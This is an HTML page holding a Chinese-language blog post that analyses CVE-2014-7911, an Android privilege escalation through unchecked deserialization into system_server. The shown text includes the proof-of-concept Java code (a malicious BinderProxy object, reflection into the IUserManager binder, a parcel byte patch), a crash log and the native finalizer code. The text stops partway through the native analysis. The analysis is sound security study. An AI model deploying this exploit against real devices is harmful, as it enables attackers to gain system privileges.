<!DOCTYPE html>
<html lang="zh-Hans">
  <head>
    
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="description" content="CVE-2014-7911安卓本地提权漏洞详细分析"/>







  <link rel="alternate" href="/atom.xml" title="Ele7enxxh's Blog">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.png?v=2.2.x" />



<link rel="canonical" href="http://ele7enxxh.com/CVE-2014-7911-Detailed-Analysis-Of-Android-Local-Privilege-Escalation-To-System-Vulnerability.html"/>


<meta name="description" content="本文对CVE-2014-7911漏洞的原理以及利用进行了详细分析。">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2014-7911安卓本地提权漏洞详细分析">
<meta property="og:url" content="http://ele7enxxh.com/CVE-2014-7911-Detailed-Analysis-Of-Android-Local-Privilege-Escalation-To-System-Vulnerability.html">
<meta property="og:site_name" content="Ele7enxxh's Blog">
<meta property="og:description" content="本文对CVE-2014-7911漏洞的原理以及利用进行了详细分析。">
<meta property="og:image" content="http://ele7enxxh.com/images/CVE-2014-7911-Detailed-Analysis-Of-Android-Local-Privilege-Escalation-To-System-Vulnerability_1.png">
<meta property="og:image" content="http://ele7enxxh.com/images/CVE-2014-7911-Detailed-Analysis-Of-Android-Local-Privilege-Escalation-To-System-Vulnerability_2.png">
<meta property="og:image" content="http://ele7enxxh.com/images/CVE-2014-7911-Detailed-Analysis-Of-Android-Local-Privilege-Escalation-To-System-Vulnerability_3.png">
<meta property="og:updated_time" content="2016-03-23T06:30:43.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CVE-2014-7911安卓本地提权漏洞详细分析">
<meta name="twitter:description" content="本文对CVE-2014-7911漏洞的原理以及利用进行了详细分析。">
<meta name="twitter:image" content="http://ele7enxxh.com/images/CVE-2014-7911-Detailed-Analysis-Of-Android-Local-Privilege-Escalation-To-System-Vulnerability_1.png">


<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.2.x" />



  <link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" />





<script>
  var CONFIG = {
    search: true,
    searchPath: "/search.xml",
    fancybox: true,
    toc: true,
  }
</script>




  
  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?e9925f9b47e12674b38b04ce3cde49e6";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>




    <title> CVE-2014-7911安卓本地提权漏洞详细分析 · Ele7enxxh's Blog </title>
  </head>

  <body><div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/." class="logo">Ele7enxxh's Blog</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>

<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list">
    
      <a href="/">
        <li class="mobile-menu-item">
          
          
            Home
          
        </li>
      </a>
    
      <a href="/archives/">
        <li class="mobile-menu-item">
          
          
            Archives
          
        </li>
      </a>
    
  </ul>
</nav>

    <div class="container" id="mobile-panel">
      <header id="header" class="header"><div class="logo-wrapper">
  <a href="/." class="logo">Ele7enxxh's Blog</a>
</div>

<nav class="site-navbar">
  
    <ul id="menu" class="menu">
      
        <li class="menu-item">
          <a class="menu-item-link" href="/">
            
            
              Home
            
          </a>
        </li>
      
        <li class="menu-item">
          <a class="menu-item-link" href="/archives/">
            
            
              Archives
            
          </a>
        </li>
      
      
        <li class="menu-search">
          <form>
            <i class="iconfont icon-search" id="open-search"></i>
            <input type="text" class="search-input" id="search-input" />
            <i class="iconfont icon-close" id="close-search"></i>
          </form>
        </li>
      
    </ul>
  
</nav>
      </header>

      <main id="main" class="main">
        <div class="content-wrapper">
          <div id="content" class="content">
            
  
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          CVE-2014-7911安卓本地提权漏洞详细分析
        
      </h1>

      <div class="post-meta">
        <span class="post-time">
          Jul 2, 2015
        </span>
      </div>
    </header>

    
    
  <div class="post-toc" id="post-toc">
    <h2 class="post-toc-title">Contents</h2>
    <div class="post-toc-content">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#简介"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#基础知识"><span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析环境与工具"><span class="toc-text">分析环境与工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞分析"><span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Java层分析"><span class="toc-text">Java层分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#第一步，构建一可序列化的恶意对象"><span class="toc-text">第一步，构建一可序列化的恶意对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#第二步，准备传入system-server的数据"><span class="toc-text">第二步，准备传入system_server的数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#第三步，向system-server传入不可序列化的Bundle参数"><span class="toc-text">第三步，向system_server传入不可序列化的Bundle参数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Native层分析"><span class="toc-text">Native层分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#汇编代码分析"><span class="toc-text">汇编代码分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用"><span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过ASLR"><span class="toc-text">绕过ASLR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dalvik-heap-spary"><span class="toc-text">Dalvik-heap spary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Spray-addresses-manipulation"><span class="toc-text">Spray addresses manipulation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ROP"><span class="toc-text">ROP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC"><span class="toc-text">POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考文献"><span class="toc-text">参考文献</span></a></li></ol>
    </div>
  </div>


    <div class="post-content">
      
        <p>本文对CVE-2014-7911漏洞的原理以及利用进行了详细分析。<a id="more"></a></p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>CVE-2014-7911是由Jann Horn发现的一个有关安卓的提权漏洞，该漏洞允许恶意应用从普通应用权限提权到system用户执行命令。在Android5.0之前的版本中，java.io.ObjectInputStream没有检查要反序列化的对象是否真的可以序列化，攻击者利用此漏洞，构造恶意对象可在sysem_server进程中执行任意代码并获取提升的权限。CVE-2014-7911是一个非常有学习价值的漏洞，虽然由于Android的碎片化，构造的ROP链很难做到通用，但是其涉及的知识非常广泛，包括Java序列化与反序列化、Dalvik GC机制、Android binder机制、heap spary、ROP、stack pivot。</p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>由于该漏洞的原理与利用涉及了很多方面，这里不一一介绍，贴出一些链接：<br>Java序列化与反序列化：<br><a href="http://www.cnblogs.com/xdp-gacl/p/3777987.html" target="_blank" rel="external">http://www.cnblogs.com/xdp-gacl/p/3777987.html</a><br><a href="http://developer.51cto.com/art/201202/317181.htm" target="_blank" rel="external">http://developer.51cto.com/art/201202/317181.htm</a><br>Android binder机制：<br><a href="http://blog.csdn.net/luoshengyang/article/details/6618363" target="_blank" rel="external">http://blog.csdn.net/luoshengyang/article/details/6618363</a><br>heap spray：<br><a href="http://blog.csdn.net/magictong/article/details/7391397" target="_blank" rel="external">http://blog.csdn.net/magictong/article/details/7391397</a><br>ROP：<br><a href="http://drops.wooyun.org/papers/4077" target="_blank" rel="external">http://drops.wooyun.org/papers/4077</a><br><a href="http://blog.csdn.net/l173864930/article/details/14000343" target="_blank" rel="external">http://blog.csdn.net/l173864930/article/details/14000343</a></p>
<h2 id="分析环境与工具"><a href="#分析环境与工具" class="headerlink" title="分析环境与工具"></a>分析环境与工具</h2><p>Android版本：Android4.4.4_r1<br>手机：Nexus5<br>IDA 6.5</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>由于网上已有分析文献加上本人文笔有限，本文将根据参考文献进行更加细致的分析。<br>为了方便阅读，下面我贴上部分参考文献，并补充我在分析时对漏洞的理解：</p>
<blockquote>
<p>在Jann Horm给出的漏洞信息与POC中(1]，向system_server传入的是不可序列化的android.os.BinderProxy对象实例，其成员变量在反序列化时发生类型混淆，由于BinderProxy的finalize方法包含本地代码，于是在本地代码执行时将成员变量强制转换为指针，注意到成员变量是攻击者可控的，也就意味着攻击者可以控制该指针，使其指向攻击者可控的地址空间，最终获得在system_server（uid=1000）中执行代码的权限。下面主要结合POC对漏洞进行详细分析，由于笔者之前对相关的Java序列化、Android binder跨进程通信和native代码都不太熟悉，主要根据参考文献进行翻译、整理和理解，不当之处，还请读者海涵。</p>
<h3 id="Java层分析"><a href="#Java层分析" class="headerlink" title="Java层分析"></a>Java层分析</h3><h4 id="第一步，构建一可序列化的恶意对象"><a href="#第一步，构建一可序列化的恶意对象" class="headerlink" title="第一步，构建一可序列化的恶意对象"></a>第一步，构建一可序列化的恶意对象</h4><p>创建AAdroid.os.BinderProxy对象，并将其放入Bundle数据中：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Bundle bundle = <span class="keyword">new</span> Bundle();</div><div class="line">AAdroid.os.BinderProxy evilProxy = <span class="keyword">new</span> AAdroid.os.BinderProxy();</div><div class="line">bundle.putSerializable(<span class="string">"eatthis"</span>, evilProxy);</div><div class="line">&gt;</div></pre></td></tr></table></figure></p>
<p>注意AAdroid.os.BinderProxy是可序列化的，其成员变量mOrgue就是随后用于改变程序执行流程的指针。随后该可序列化的AAdroid.os.BinderProxy将在传入system_server之间修改为不可序列化的Android.os.BinderProxy对象：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinderProxy</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</div><div class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">0</span>;</div><div class="line">	<span class="comment">//public long mObject = 0x1337beef;</span></div><div class="line">	<span class="comment">//public long mOrgue = 0x1337beef;</span></div><div class="line">	<span class="comment">//注意：此处要根据待测的Android版本号设置，在我们待测试的Android 4.4.4中，BinderProxy的这两个Field为private int，这样才能保证POC访问的地址为我们设置的值0x1337beef</span></div><div class="line">	<span class="keyword">private</span> <span class="keyword">int</span> mObject = <span class="number">0x1337beef</span>;</div><div class="line">	<span class="keyword">private</span> <span class="keyword">int</span> mOrgue = <span class="number">0x1337beef</span>;</div></pre></td></tr></table></figure></p>
</blockquote>
<p>AAdroid.os.BinderProxy可序列化的原因是我们需要首先将恶意对象序列化并存入bundle对象中，才能将其传递给system_server进程。<br>mOrgue和mObject的类型可以查看源码（frameworks/base/core/java/android/os/Binder.java）。</p>
<blockquote>
<h4 id="第二步，准备传入system-server的数据"><a href="#第二步，准备传入system-server的数据" class="headerlink" title="第二步，准备传入system_server的数据"></a>第二步，准备传入system_server的数据</h4><p>主要通过一系列java的反射机制，获得android.os.IUserManager.Stub和andrioid.os.IUserManager.Stub.Proxy的Class对象，最终获得跨进程调用system_server的IBinder接口mRemote，以及调用UserManager.setApplicationRestriction函数的TRANSACTION_setApplicationRestriction，为与system_server的跨进程Binder通信作准备：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">Class stubClass = <span class="keyword">null</span>;</div><div class="line"><span class="keyword">for</span> (Class inner : Class.forName(<span class="string">"android.os.IUserManager"</span>).getDeclaredClasses()) &#123;</div><div class="line">    <span class="keyword">if</span> (inner.getCanonicalName().equals(<span class="string">"android.os.IUserManager.Stub"</span>)) &#123;</div><div class="line">        stubClass = inner;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">Field TRANSACTION_setApplicationRestrictionsField = stubClass.getDeclaredField(<span class="string">"TRANSACTION_setApplicationRestrictions"</span>);</div><div class="line">TRANSACTION_setApplicationRestrictionsField.setAccessible(<span class="keyword">true</span>);</div><div class="line">TRANSACTION_setApplicationRestrictions = TRANSACTION_setApplicationRestrictionsField.getInt(<span class="keyword">null</span>);</div><div class="line">Class proxyClass = <span class="keyword">null</span>;</div><div class="line"><span class="keyword">for</span> (Class inner : stubClass.getDeclaredClasses()) &#123;</div><div class="line">    <span class="keyword">if</span> (inner.getCanonicalName().equals(<span class="string">"android.os.IUserManager.Stub.Proxy"</span>)) &#123;</div><div class="line">        proxyClass = inner;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">UserManager userManager = (UserManager) context.getSystemService(Context.USER_SERVICE);</div><div class="line">Field mServiceField = UserManager.class.getDeclaredField(<span class="string">"mService"</span>);</div><div class="line">mServiceField.setAccessible(<span class="keyword">true</span>);</div><div class="line">Object mService = mServiceField.get(userManager);</div><div class="line">Field mRemoteField = proxyClass.getDeclaredField(<span class="string">"mRemote"</span>);</div><div class="line">mRemoteField.setAccessible(<span class="keyword">true</span>);</div><div class="line">mRemote = (IBinder) mRemoteField.get(mService);</div><div class="line">UserHandle userHandle = android.os.Process.myUserHandle();</div><div class="line">setApplicationRestrictions(context.getPackageName(), bundle, userHandle.hashCode());</div></pre></td></tr></table></figure></p>
</blockquote>
<p>这里有一个很基础的问题，为什么我们一定要把这个对象传递进system_server进程呢？system_server进程拥有system权限，我们通过将对象传递给system_server，利用一些技巧达到提权到system的目的。<br>这段连续的java反射涉及到了Android binder进程间通讯的知识，有兴趣的可以下来深入研究。</p>
<blockquote>
<h4 id="第三步，向system-server传入不可序列化的Bundle参数"><a href="#第三步，向system-server传入不可序列化的Bundle参数" class="headerlink" title="第三步，向system_server传入不可序列化的Bundle参数"></a>第三步，向system_server传入不可序列化的Bundle参数</h4><p>调用setApplicationRestrictions这个函数，传入之前打包evilproxy的Bundle数据作为参数。将该函数与Android源码中的setApplicationRestrication函数对比，主要的区别在于将传入的Bundle数据进行了修改，将之前可序列化的AAdroid.os.BinderProxy对象修改为了不可序列化的Android.os.BinderProxy对象，这样就将不可序列化的Bundles数据，通过Binder跨进程调用，传入system_server的Android.os.UserManager.setApplicationRestrictions方法：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">setApplicationRestrictions</span><span class="params">(java.lang.String packageName, android.os.Bundle restrictions, <span class="keyword">int</span> userHandle)</span> <span class="keyword">throws</span> android.os.RemoteException </span>&#123;</div><div class="line">	android.os.Parcel _data = android.os.Parcel.obtain();</div><div class="line">	android.os.Parcel _reply = android.os.Parcel.obtain();</div><div class="line">	<span class="keyword">try</span> &#123;</div><div class="line">	   _data.writeInterfaceToken(DESCRIPTOR);</div><div class="line">	   _data.writeString(packageName);</div><div class="line">	   _data.writeInt(<span class="number">1</span>);</div><div class="line">	   restrictions.writeToParcel(_data, <span class="number">0</span>);</div><div class="line">	   _data.writeInt(userHandle);</div><div class="line">	   <span class="keyword">byte</span>[] data = _data.marshall();</div><div class="line">	   <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; <span class="keyword">true</span>; i++) &#123;</div><div class="line">	       <span class="keyword">if</span> (data[i] == <span class="string">'A'</span> &amp;&amp; data[i+<span class="number">1</span>] == <span class="string">'A'</span> &amp;&amp; data[i+<span class="number">2</span>] == <span class="string">'d'</span> &amp;&amp; data[i+<span class="number">3</span>] == <span class="string">'r'</span>) &#123;</div><div class="line">	           data[i] = <span class="string">'a'</span>;</div><div class="line">	           data[i+<span class="number">1</span>] = <span class="string">'n'</span>;</div><div class="line">	           <span class="keyword">break</span>;</div><div class="line">	       &#125;</div><div class="line">	   &#125;</div><div class="line">	   _data.recycle();</div><div class="line">	   _data = Parcel.obtain();</div><div class="line">	   _data.unmarshall(data, <span class="number">0</span>, data.length);</div><div class="line">	   mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, <span class="number">0</span>);</div><div class="line">	   _reply.readException();</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">finally</span> &#123;</div><div class="line">	   _reply.recycle();</div><div class="line">	   _data.recycle();</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
</blockquote>
<p>事实上，我们并非必须使用Android.os.UserManager.setApplicationRestrictions方法向system_server传递对象，我们需要的是找到一个途径将序列化后的对象传递进system_server进程，并且system_server会将该对象反序列化，只要满足这样的条件均可。<br>还有一个问题：为什么我们要修改AAdroid.os.BinderProxy为Android.os.BinderProxy？这个问题我将会在后面解释。</p>
<blockquote>
<p>安装POC，启动Activity后将其最小化，触发GC，引起Android系统重启，从Logcat日志中可以看到，system_server执行到了之前设置的BinderProxy对象的0x1337beef这个值，访问了不该访问的内存，导致异常。错误信号、寄存器快照和调用栈如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">05-14 18:30:55.974: I/DEBUG(3695): Build fingerprint: &apos;google/hammerhead/hammerhead:4.4.4/KTU84P/1227136:user/release-keys&apos;</div><div class="line">05-14 18:30:55.974: I/DEBUG(3695): Revision: &apos;11&apos;</div><div class="line">05-14 18:30:55.974: I/DEBUG(3695): pid: 1552, tid: 1560, name: FinalizerDaemon  &gt;&gt;&gt; system_server &lt;&lt;&lt;</div><div class="line">05-14 18:30:55.974: I/DEBUG(3695): signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 1337bef3</div><div class="line">05-14 18:30:56.064: I/DEBUG(3695):     r0 1337beef  r1 401b89d9  r2 746fdad8  r3 6d4fbdc4</div><div class="line">05-14 18:30:56.064: I/DEBUG(3695):     r4 401b89d9  r5 1337beef  r6 713e3f68  r7 1337beef</div><div class="line">05-14 18:30:56.064: I/DEBUG(3695):     r8 1337beef  r9 74709f68  sl 746fdae8  fp 74aacb24</div><div class="line">05-14 18:30:56.064: I/DEBUG(3695):     ip 401f08a4  sp 74aacae8  lr 401b7981  pc 40105176  cpsr 200d0030</div><div class="line">...</div><div class="line">I/DEBUG   (  241): backtrace:</div><div class="line">I/DEBUG   (  241):     #00  pc 0000d176  /system/lib/libutils.so (android::RefBase::decStrong(void const*) const+3)</div><div class="line">I/DEBUG   (  241):     #01  pc 0007097d  /system/lib/libandroid_runtime.so</div><div class="line">I/DEBUG   (  241):     #02  pc 0001dbcc  /system/lib/libdvm.so (dvmPlatformInvoke+112)</div><div class="line">I/DEBUG   (  241):     #03  pc 0004e123  /system/lib/libdvm.so (dvmCallJNIMethod(unsigned int const*, JValue*, Method const*, Thread*)+398)</div><div class="line">I/DEBUG   (  241):     #04  pc 00026fe0  /system/lib/libdvm.so</div><div class="line">I/DEBUG   (  241):     #05  pc 0002dfa0  /system/lib/libdvm.so (dvmMterpStd(Thread*)+76)</div><div class="line">I/DEBUG   (  241):     #06  pc 0002b638  /system/lib/libdvm.so (dvmInterpret(Thread*, Method const*, JValue*)+184)</div><div class="line">I/DEBUG   (  241):     #07  pc 0006057d  /system/lib/libdvm.so (dvmCallMethodV(Thread*, Method const*, Object*, bool, JValue*, std::__va_list)+336)</div><div class="line">I/DEBUG   (  241):     #08  pc 000605a1  /system/lib/libdvm.so (dvmCallMethod(Thread*, Method const*, Object*, JValue*, ...)+20)</div><div class="line">I/DEBUG   (  241):     #09  pc 00055287  /system/lib/libdvm.so</div><div class="line">I/DEBUG   (  241):     #10  pc 0000d170  /system/lib/libc.so (__thread_entry+72)</div><div class="line">I/DEBUG   (  241):     #11  pc 0000d308  /system/lib/libc.so (pthread_create+240)</div></pre></td></tr></table></figure></p>
</blockquote>
<p>这里有个关键问题：<br>为什么要触发GC，触发GC后发生了什么导致漏洞的触发？同样我会在下面解释。</p>
<blockquote>
<h3 id="Native层分析"><a href="#Native层分析" class="headerlink" title="Native层分析"></a>Native层分析</h3><p>假如BinderProxy可以被序列化，那么在反序列化时，其field引用的对象也会被反序列化；但在POC中ObjectInputStream反序列化的BinderProxy对象实例不可序列化，这样在ObjectInputStream反序列化BinderProxy对象时，发生了类型混淆（type confusion），其field被当做随后由Native代码处理的指针。这个filed就是之前设置的0x1337beef，具体而言，就是mOrgue这个变量。<br>android.os.BinderProxy的finalize方法调用native代码，将mOrgue处理为指针：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@Override</span></div><div class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">finalize</span><span class="params">()</span> <span class="keyword">throws</span> Throwable </span>&#123;</div><div class="line">	<span class="keyword">try</span> &#123;</div><div class="line">			destroy();</div><div class="line">	&#125; <span class="keyword">finally</span> &#123;</div><div class="line">		<span class="keyword">super</span>.finalize();	</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
</blockquote>
<p>不熟悉Java GC机制的不会明白此处finalize方法和我们的漏洞利用有什么关系，这里我将简单介绍一下Java对象的生命周期与垃圾回收（从网上摘抄，出处不详）：<br>创建对象的方式：</p>
<ul>
<li>用new语句创建对象。</li>
<li>使用反射，调用java.lang.Class或java.lang.reflect.Constructor的newInstance()实例方法。</li>
<li>调用对象的clone()方法</li>
<li>使用反序列化手段，调用java.io.ObjectInputStream对象的readObject()方法。</li>
</ul>
<p>垃圾回收：<br>对象的可触及性：</p>
<ul>
<li>可触及状态：当一个对象被创建后，只要程序中还有引用变量引用该对象，那么它就始终处于可触及状态。</li>
<li>可复活状态：当程序不再有任何引用变量引用对象时，它就进入可复活状态。该状态的对象，垃圾回收器会准备释放它占用的内存，在释放前，会调用它的finalize()方法，这些finalize()方法有可能使对象重新转到可触及状态。</li>
<li>不可触及状态：当JVM执行完所有的可复活状态的finalize()方法后，假如这些方法都没有使对象转到可触及状态。那么该对象就进入不可触及状态。只有当对象处于不可触及状态时，垃圾回收器才会真正回收它占用的内存。</li>
</ul>
<p>为什么要触发GC，触发GC后发生了什么导致漏洞的触发？<br>答：当system_server对传进来的对象进行反序列化后就创建了对象，启动Activity后将其最小化，触发GC，注意该对象并没有任何引用，GC清理时就会调用该对象的finalize方法，即调用了Android.os.BinderProxy的finalize方法。</p>
<blockquote>
<p>其中，destroy为native方法：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span></span>;</div></pre></td></tr></table></figure></p>
<p>cpp代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">android_os_BinderProxy_destroy</span><span class="params">(JNIEnv* env, jobject obj)</span></span></div><div class="line">&#123;</div><div class="line">	IBinder* b = (IBinder*)</div><div class="line">		env-&gt;GetIntField(obj, gBinderProxyOffsets.mObject);</div><div class="line">	DeathRecipientList* drl = (DeathRecipientList*)</div><div class="line">		env-&gt;GetIntField(obj, gBinderProxyOffsets.mOrgue);</div><div class="line">	LOGDEATH(<span class="string">"Destroying BinderProxy %p: binder=%p drl=%p\n"</span>, obj, b, drl);</div><div class="line">	env-&gt;SetIntField(obj, gBinderProxyOffsets.mObject, <span class="number">0</span>);</div><div class="line">	env-&gt;SetIntField(obj, gBinderProxyOffsets.mOrgue, <span class="number">0</span>);</div><div class="line">	drl-&gt;decStrong((<span class="keyword">void</span>*)javaObjectForIBinder);</div><div class="line">	b-&gt;decStrong((<span class="keyword">void</span>*)javaObjectForIBinder);</div><div class="line">	IPCThreadState::self()-&gt;flushCommands();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>最终native代码调用上述decStrong方法，从<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">DeathRecipientList* drl = (DeathRecipientList*)</div><div class="line">	env-&gt;GetIntField(obj, gBinderProxyOffsets.mOrgue);</div></pre></td></tr></table></figure></p>
<p>这一行可以看出，drl就是mOrgue，可以被攻击者控制。 所以，drl-&gt;decStrong方法调用使用的this指针可由攻击者控制。<br>gBinderProxyOffsets.mObject和gBinderProxyOffsets.mOrgue<br>在android_util_Binder.cpp中的int_register_android_os_BinderProxy方法完成初始化：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gBinderProxyOffsets.mObject  = env-&gt;GetFieldID(clazz, <span class="string">"mObject"</span>, <span class="string">"I"</span>);</div><div class="line">gBinderProxyOffsets.mOrgue = env-&gt;GetFieldID(clazz, <span class="string">"mOrgue"</span>, <span class="string">"I"</span>);</div></pre></td></tr></table></figure></p>
</blockquote>
<p>即是AAdroid.os.BinderProxy中的变量mObject和mOrgue。<br>为什么我们要修改AAdroid.os.BinderProxy以及为什么要修改为Android.os.BinderProxy？<br>答：注意我们仅仅是向system_server进程传递了一个恶意对象实例，此时没有任何该对象的方法或者数据被使用，然而由于Java GC机制，当该对象被清理时，GC将调用他的finalize方法。然后如果只有如此，我们仍然无法利用，因为finalize方法仍然是不可控的，我们目前唯一能控制的是该恶意对象，回到我们选择的Android.os.BinderProxy，它在其finalize方法中将变量mObject和mOrgue强制转换为函数指针，并调用。而注意的是，我们可以控制mObject和mOrgue的值，这样就相当于我们可以向system_server传递一个任意值的函数指针this，并在该对象实例被GC时有机会获得控制权。</p>
<blockquote>
<p>再看一下RefBase类中的decStrong方法<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span> RefBase::decStrong(<span class="keyword">const</span> <span class="keyword">void</span>* id) <span class="keyword">const</span></div><div class="line">&#123;</div><div class="line">	weakref_impl* <span class="keyword">const</span> refs = mRefs;</div><div class="line">	refs-&gt;removeStrongRef(id);</div><div class="line">	<span class="keyword">const</span> <span class="keyword">int32_t</span> c = android_atomic_dec(&amp;refs-&gt;mStrong);</div><div class="line">	<span class="meta">#<span class="meta-keyword">if</span> PRINT_REFS</span></div><div class="line">	ALOGD(<span class="string">"decStrong of %p from %p: cnt=%d\n"</span>, <span class="keyword">this</span>, id, c);</div><div class="line">	<span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">	ALOG_ASSERT(c &gt;= <span class="number">1</span>, <span class="string">"decStrong() called on %p too many times"</span>, refs);</div><div class="line">	<span class="keyword">if</span> (c == <span class="number">1</span>) &#123;</div><div class="line">		refs-&gt;mBase-&gt;onLastStrongRef(id);</div><div class="line">		<span class="keyword">if</span> ((refs-&gt;mFlags&amp;OBJECT_LIFETIME_MASK) == OBJECT_LIFETIME_STRONG) == 	OBJECT_LIFETIME_STRONG) &#123;</div><div class="line">			<span class="keyword">delete</span> <span class="keyword">this</span>;</div><div class="line">		&#125;</div><div class="line">		refs-&gt;decWeak(id);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
